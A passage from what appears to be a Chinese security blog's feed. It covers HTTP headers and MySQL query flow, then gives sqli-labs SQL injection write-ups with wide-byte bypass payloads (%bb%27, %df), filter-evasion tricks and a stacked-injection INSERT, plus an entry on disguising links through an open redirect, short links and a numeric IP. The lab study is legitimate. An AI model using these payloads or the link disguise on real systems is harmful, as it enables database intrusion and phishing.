如果没有加密，他们安全级别都是一样的，随便一个监听器都可以把所有的数据监听到。</li><li>GET请求能够被缓存，GET请求会保存在浏览器的浏览记录中，以GET请求的URL能够保存为浏览器书签，post请求不具有这些功能。</li><li>HTTP的底层是TCP&#x2F;IP，GET和POST的底层也是TCP&#x2F;IP，也就是说，GET&#x2F;POST都是TCP链接。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。<br>7.GET产生一个TCP数据包，对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；POST产生两个TCP数据包，对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据），并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</li></ol><h1 id="七-http详解"><a href="#七-http详解" class="headerlink" title="七.http详解"></a>七.http详解</h1><h2 id="1-HTTP头部详解"><a href="#1-HTTP头部详解" class="headerlink" title="1.HTTP头部详解"></a>1.HTTP头部详解</h2><p>1、 Accept：告诉WEB服务器自己接受什么介质类型，*&#x2F;* 表示任何类型，type&#x2F;* 表示该类型下的所有子类型，type&#x2F;sub-type。<br>2、 Accept-Charset： 浏览器申明自己接收的字符集<br> Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）<br> Accept-Language：：浏览器申明自己接收的语言<br>语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。<br>3、 Accept-Ranges：WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。<br>4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。<br>5、 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器。<br>6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取）<br>max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）<br>max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）<br>min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）<br>响应：public(可以用 Cached 内容回应任何用户)<br>private（只能用缓存内容回应先前请求该内容的那个用户）<br>no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）<br>max-age：（本响应包含的对象的过期时间）<br>ALL: no-store（不允许缓存）<br>7、 Connection：请求：close（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。<br>keepalive（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。<br>响应：close（连接已经关闭）。<br>keepalive（连接保持着，在等待本次连接的后续请求）。<br>Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300<br>8、 Content-Encoding：WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip<br>9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。<br>10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012<br>11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021&#x2F;47022<br>12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application&#x2F;xml<br>13、 ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。<br>14、 Expired：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP&#x2F;1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT<br>15、 Host：客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号。例如：Host：rss.sina.com.cn<br>16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。<br>17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。<br>18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT<br>19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。<br>20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。<br>21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT<br>22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如：Location：<a href="http://i0.sinaimg.cn/">http://i0.sinaimg.cn</a> &#x2F;dy&#x2F;deco&#x2F;2008&#x2F;0528&#x2F;sinahome_0803_ws_005_text_0.gif<br>23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache<br>24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。<br>25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes&#x3D;1173546-<br>26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页&#x2F;URL 获得&#x2F;点击 当前请求中的网址&#x2F;URL。例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a><br>27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache&#x2F;2.0.61 (Unix)<br>28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko&#x2F;20080404 Firefox&#x2F;2、0、0、14<br>29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked<br>30、 Vary: WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding<br>31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80 (squid&#x2F;2.6.STABLE13)</p><h2 id="2-http-Request-Header"><a href="#2-http-Request-Header" class="headerlink" title="2.http Request Header"></a>2.http Request Header</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703929379662-3a51d2b4-5871-4717-bb72-bc86c894b3ca.png"></p><h2 id="3-HTTP-Responses-Header"><a href="#3-HTTP-Responses-Header" class="headerlink" title="3.HTTP Responses Header"></a>3.HTTP Responses Header</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703929624276-9eb9e6bc-686e-4594-8470-4ab51a6d8a8d.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703929633548-63d2ba52-3d3e-48e2-ba24-db0686967757.png"></p><h2 id="4-常见请求头"><a href="#4-常见请求头" class="headerlink" title="4.常见请求头"></a>4.常见请求头</h2><p>Host<br>Host请求报头域主要用于指定被请求资源的Internet主机和端口号。<br>如：Host: localhost:8088</p><p>User-Agent<br>User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。登录一些网站时，很多时候都可以见到显示我们的浏览器、系统信息，这些都是此头的作用。<br>如：User-Agent: Mozilla&#x2F;5.0</p><p>Referer<br>Referer包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。<br>如：Referer: <a href="http://192.168.33.1/sqli/Less-18/">http://192.168.33.1/sqli/Less-18/</a></p><p>Cookie<br>Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。<br>如：Cookie: username&#x3D;admin; password&#x3D;admin</p><p>Range<br>Range可以请求实体的部分内容，多线程下载一定会用到此请求头。<br>如：表示头500字节：Range: bytes&#x3D;0<del>499<br>  表示第二个500字节：Range: bytes&#x3D;500</del>999<br>  表示最后500字节：Range: bytes&#x3D;-500<br>  表示500字节以后的范围：Range: bytes&#x3D;500-</p><p>X-Forwarded-For<br>X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。<br>如：X-Forwarded-For: 8.8.8.8</p><p>Accept<br>Accept请求报头域用于指定客户端接收哪些MIME类型的信息。<br>如：Accept: text&#x2F;html</p><p>Accept-Charset<br>Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。<br>如： Accept-Charset: gb2312</p><h1 id="八-MySQL架构总览："><a href="#八-MySQL架构总览：" class="headerlink" title="八.MySQL架构总览："></a>八.MySQL架构总览：</h1><p> 架构最好看图，再配上必要的说明文字。<br> 下图根据参考书籍中一图为原本，再在其上添加上了自己的理解。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703929796108-dd50ac39-ebf9-4edd-9474-a088ec214bf7.png"></p><p> 从上图中我们可以看到，整个架构分为两层，上层是MySQLD的被称为的‘SQL Layer’，下层是各种各样对上提供接口的存储引擎，被称为‘Storage Engine Layer’。其它各个模块和组件，从名字上就可以简单了解到它们的作用，这里就不再累述了。</p><h1 id="九、查询执行流程"><a href="#九、查询执行流程" class="headerlink" title="九、查询执行流程"></a>九、查询执行流程</h1><h2 id="1-连接"><a href="#1-连接" class="headerlink" title="1.连接"></a>1.连接</h2><p> 1.1客户端发起一条Query请求，监听客户端的‘连接管理模块’接收请求<br> 1.2将请求转发到‘连接进&#x2F;线程模块’<br> 1.3调用‘用户模块’来进行授权检查<br> 1.4通过检查后，‘连接进&#x2F;线程模块’从‘线程连接池’中取出空闲的被缓存的连接线程和客户端请求对接，如果失败则创建一个新的连接请求</p><h2 id="2-处理"><a href="#2-处理" class="headerlink" title="2.处理"></a>2.处理</h2><p> 2.1先查询缓存，检查Query语句是否完全匹配，接着再检查是否具有权限，都成功则直接取数据返回<br> 2.2上一步有失败则转交给‘命令解析器’，经过词法分析，语法分析后生成解析树<br> 2.3接下来是预处理阶段，处理解析器无法解决的语义，检查权限等，生成新的解析树<br> 2.4再转交给对应的模块处理<br> 2.5如果是SELECT查询还会经由‘查询优化器’做大量的优化，生成执行计划<br> 2.6模块收到请求后，通过‘访问控制模块’检查所连接的用户是否有访问目标表和目标字段的权限<br> 2.7有则调用‘表管理模块’，先是查看table cache中是否存在，有则直接对应的表和获取锁，否则重新打开表文件<br> 2.8根据表的meta数据，获取表的存储引擎类型等信息，通过接口调用对应的存储引擎处理<br> 2.9上述过程中产生数据变化的时候，若打开日志功能，则会记录到相应二进制日志文件中</p><h2 id="3-结果"><a href="#3-结果" class="headerlink" title="3.结果"></a>3.结果</h2><p> 3.1Query请求完成后，将结果集返回给‘连接进&#x2F;线程模块’<br> 3.2返回的也可以是相应的状态标识，如成功或失败等<br> 3.3‘连接进&#x2F;线程模块’进行后续的清理工作，并继续等待请求或断开与客户端的连接</p><h2 id="4-一图小总结"><a href="#4-一图小总结" class="headerlink" title="4.一图小总结"></a>4.一图小总结</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703929796243-d4c14175-7135-4e3a-a530-e010210739cc.png"></p><h1 id="十-过滤："><a href="#十-过滤：" class="headerlink" title="十.过滤："></a>十.过滤：</h1><p><a href="https://www.yuque.com/u39301944/dozv1h/qwgbvrnywcq9mrgg?view=doc_embed">绕过总结</a></p><h1 id="十一-宽字节注入原理"><a href="#十一-宽字节注入原理" class="headerlink" title="十一.宽字节注入原理"></a>十一.宽字节注入原理</h1><p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’（转换的函数或者思路会在每一关遇到的时候介绍）。<br>PHP 自带一些转义特殊字符的函数，如addslashes()，mysql_real_escape_string()，mysql_escape_string()等，这些函数可用来防止 SQL 注入。<br>如id&#x3D;1’or’1’&#x3D;’1，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符\，变为1&#39;or&#39;1&#39;&#x3D;&#39;1，如此在 SQL 查询中是一个普通的字符串，不能进行注入。<br>而网站在过滤’的时候，通常的思路就是将’转换为&#39;,因此我们在此想办法将’前面添加的\去掉，一般有两种思路：<br>%bb吃掉<br>如果程序的默认字符集是GBK等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。<br>若在 PHP 中使用mysql_query(“set names gbk”)将默认字符集设为GBK，而使用addslashes()转义用户输入，这时如果用户输入%bb%27，则addslashes()会在%27前面加上一个%5c字符，即转义字符\。<br>而 MySQL 在使用GBK编码时，会认为两个字符为一个汉字，%bb%5c是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是籠，也就是说%bb%5c%27&#x3D;籠’，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。%bb并不是唯一一个可以产生宽字节注入的字符，理论上%81-%FE均可。<br>过滤&#39;中的<br>构造%bb%5c%5c%27，addslashes()会在两个%5c和%27前都加上\即%5c，变为%bb %5c%5c %5c%5c %5c%27，但宽字符集认为%bb%5c是一个字符即籠，则变为%bb%5c %5c%5c %5c%5c %27即籠\\‘，四个\正好转义为两个\，即’未被转义。这也是 bypass 的一种方法。</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-labs相关知识点总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL伪装</title>
      <link href="/2024/01/01/URL%E4%BC%AA%E8%A3%85/"/>
      <url>/2024/01/01/URL%E4%BC%AA%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="1-找一个能够跳转的网址："><a href="#1-找一个能够跳转的网址：" class="headerlink" title="1.找一个能够跳转的网址："></a>1.找一个能够跳转的网址：</h1><p><a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https%3A%2F%2Fwww.microsoft.com%2Fzh-cn%2Fsql-server%2Fsql-server-downloads</a></p><h1 id="2-获取到的链接在yakit中进行URL解码："><a href="#2-获取到的链接在yakit中进行URL解码：" class="headerlink" title="2.获取到的链接在yakit中进行URL解码："></a>2.获取到的链接在yakit中进行URL解码：</h1><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704111729706-540c7e33-abd2-4a70-bc91-451a89599413.png" alt="image.png"><br><a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a>?target&#x3D;<a href="https://www.baidu.com/">https://www.baidu.com</a><br>事实证明，跳第一个可能是java写的<br>这样就会跳到百度。<br><a href="https://link.csdn.net/?target=http://sunwu.world?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=http://www.baidu.com?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a></p><h1 id="3-但是看起来还是很明显，就可以用短链接"><a href="#3-但是看起来还是很明显，就可以用短链接" class="headerlink" title="3.但是看起来还是很明显，就可以用短链接"></a>3.但是看起来还是很明显，就可以用短链接</h1><p>将<a href="https://baidu.com短链为这个地址[https://t.doruo.cn/Wgt9QBFK](https://t.doruo.cn/Wgt9QBFK)">https://baidu.com短链为这个地址[https://t.doruo.cn/Wgt9QBFK](https://t.doruo.cn/Wgt9QBFK)</a><br>塞进去就成为一个新的地址<br><a href="https://t.doruo.cn/Wgt9QBFK">https://link.csdn.net/?target=https://t.doruo.cn/Wgt9QBFK?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a>还是能够正常访问百度。只是缺陷太大，一跳转就变回百度了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704113047344-ff2fca0c-f3a0-4b73-9d65-13753d5b3db5.png" alt="image.png"></p><h1 id="4-之后也可以将链接转为数字"><a href="#4-之后也可以将链接转为数字" class="headerlink" title="4.之后也可以将链接转为数字"></a>4.之后也可以将链接转为数字</h1><p><a href="http://www.baidu.com转数字是1861370946/">www.baidu.com转数字是1861370946</a><br><a href="https://t.doruo.cn/Wgt9QBFK">https://link.csdn.net/?target=https://1861370946?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a><a href="https://t.doruo.cn/Wgt9QBFK">?target&#x3D;https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a><a href="https://t.doruo.cn/Wgt9QBFK">?target&#x3D;https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a><a href="https://t.doruo.cn/Wgt9QBFK">?target&#x3D;https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704113047344-ff2fca0c-f3a0-4b73-9d65-13753d5b3db5.png"></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 参数污染URL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过滤和宽字节,堆叠注入讲解</title>
      <link href="/2024/01/01/%E8%BF%87%E6%BB%A4%E5%92%8C%E5%AE%BD%E5%AD%97%E8%8A%82-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E8%AE%B2%E8%A7%A3/"/>
      <url>/2024/01/01/%E8%BF%87%E6%BB%A4%E5%92%8C%E5%AE%BD%E5%AD%97%E8%8A%82-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p> 一.过滤：<br>此次以26a举例：</p><h1 id="1-源码分析："><a href="#1-源码分析：" class="headerlink" title="1.源码分析："></a>1.源码分析：</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的 <span class="string">&#x27;or&#x27;</span>（不区分大小写）替换为空字符串。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的 <span class="string">&#x27;and&#x27;</span>（不区分大小写）替换为空字符串。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的 <span class="string">&#x27;/&#x27;</span> 和 <span class="string">&#x27;*&#x27;</span> 替换为空字符串。这里使用了正则表达式来匹配斜杠和星号，需要使用转义字符 <span class="string">&#x27;\/&#x27;</span> 和 <span class="string">&#x27;\*&#x27;</span> 来表示它们。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的 <span class="string">&#x27;--&#x27;</span> 替换为空字符串。</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的 <span class="string">&#x27;#&#x27;</span> 替换为空字符串。</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的空格替换为空字符串。这里使用了正则表达式 <span class="string">&#x27;\s&#x27;</span> 来匹配空格。</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码是重复了上一行代码的操作。疑似错误，可能是重复的代码行。</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>. `<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);`</span><br><span class="line">   这行代码使用 `<span class="title function_ invoke__">preg_replace</span>()` 函数，将字符串 `<span class="variable">$id</span>` 中的 <span class="string">&#x27;/&#x27;</span> 和 <span class="string">&#x27;\\&#x27;</span> 替换为空字符串。同样，需要使用转义字符 <span class="string">&#x27;\/&#x27;</span> 和 <span class="string">&#x27;\\\\&#x27;</span> 来表示它们。</span><br><span class="line"></span><br><span class="line">这些代码片段的目的是将 `<span class="variable">$id</span>` 中的特定字符或字符组合替换为空字符串，以实现对字符串的过滤和清理操作，以防止一些常见的安全漏洞攻击，例如 SQL 注入、路径遍历等。</span><br></pre></td></tr></table></figure><p><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);</code><br>在这段代码里面的<code>/or/i</code> 是一个正则表达式，它的作用是在字符串中查找所有的 ‘or’，不区分大小写。在这个代码里，它用于在字符串中查找并替换所有的 ‘or’。具体来说，这里的** <code>/i</code> 是一个修饰符，表示进行不区分大小写的匹配。**<br>这两行代码是针对字符串 <code>$id</code> 执行的替换操作，具体解释如下：<br> <code>$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);</code><br>   这行代码使用 <code>preg_replace()</code> 函数，将字符串 <code>$id</code> 中的空格替换为空字符串。在正则表达式 <code>&#39;/[\s]/&#39;</code> 中，**<code>[\s]</code> 表示匹配任何空白字符，包括空格、制表符等**。因此，这行代码的作用是将字符串中所有的空白字符删除。<br> <code>$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);</code><br>   这行代码使用 <code>preg_replace()</code> 函数，将字符串 <code>$id</code> 中的斜杠和反斜杠替换为空字符串。在正则表达式 <code>&#39;/[\/\\\\]/&#39;</code> 中，<code>[\/\\\\]</code> 表示匹配斜杠和反斜杠。因此，这行代码的作用是将字符串中所有的斜杠和反斜杠删除。在正则表达式中，斜杠需要使用 <code>\</code> 进行转义，因此出现了 <code>\\/\\\\</code> 的形式。<br>这些操作的目的是对字符串进行清理和过滤，删除其中的特定字符，以避免潜在的安全威胁，比如路径遍历攻击等。</p><h1 id="2-进行尝试"><a href="#2-进行尝试" class="headerlink" title="2.进行尝试"></a>2.进行尝试</h1><p>id&#x3D;1正常显示。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703939719835-ca002cda-79c2-4b48-a2de-ca5714ce4025.png" alt="image.png"><br>因为这个源代码中正则匹配只匹配一次可以用双写or或者and<br>直接用postman进行测试，此时判断闭合1”和1)回显正常，1’出现报错，接着判断符号&amp;&amp;和||，发现&amp;能够使用，用布尔盲注去判断数据库名字的第一个字符。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703940921681-95e5e09f-7722-4f01-a25c-c5d7af184ac4.png" alt="image.png"><br>用十六进制的编码进行绕过<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703942187856-46005b36-9821-4bd1-bd71-1e1cd63d5cdf.png" alt="image.png"><br>直接用发现不行。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703942294337-b47a4a31-1b32-4a0f-adf0-b92fa4116069.png" alt="image.png"><br>MySQL中的<code>database()</code>函数用于返回当前选择的数据库名，通常直接调用<code>database()</code>函数会返回当前所选择的数据库名。但是，由于 MySQL 不允许在查询中使用函数名作为列名，因此在一些情况下直接调用<code>database()</code>函数可能会导致语法错误。<br>有些情况下，为了规避这个潜在的问题，人们可能会使用十六进制表示<code>database()</code>函数，比如<code>0x6461746162617365</code>代替<code>database()</code>。这种转换通常可以规避MySQL的限制，并且可以在一些特定的场景下求得所需的结果。<br>利用MySQL CONV函数、HEX 函数与UNHEX（)函数，可以实现16进制的数据转换，例如整数的转换，以及浮点数的转换。</p><h1 id="3-内联注释绕过："><a href="#3-内联注释绕过：" class="headerlink" title="3.内联注释绕过："></a>3.内联注释绕过：</h1><p>&#x2F;<em>！select</em>&#x2F;，在mysql中注释是不会被绕过的，是会被执行的，！表示强制生效。同理也可以用十六进制编码进行绕过。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703944093663-19a6a5bd-44e1-47b4-ad80-819772d9d7cc.png" alt="image.png"></p><h1 id="4-32关宽字节："><a href="#4-32关宽字节：" class="headerlink" title="4.32关宽字节："></a>4.32关宽字节：</h1><p> 这一关主要是不管是输入’还是’’都会被转义掉，&#x2F;也会被转义。<br>这是单引号’的结果。能够正常显示但是被转义了。 直接在转义符之前用%df就能够正常注入了，%dd，%bb也都是可以的。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704109075045-92db6956-c906-4966-889d-6c0eafe8b5f6.png" alt="image.png"></p><h1 id="5-38关堆叠注入："><a href="#5-38关堆叠注入：" class="headerlink" title="5.38关堆叠注入："></a>5.38关堆叠注入：</h1><p>这38关其实是堆叠注入：<br>?id&#x3D;1’;insert into      users(id,username,password) values ( 39, database() , ‘hello ‘) –+<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703925740708-354d1230-c6bf-4b29-942e-3bd87db12af0.png" alt="image.png"><br>?id&#x3D;39– -<br><img 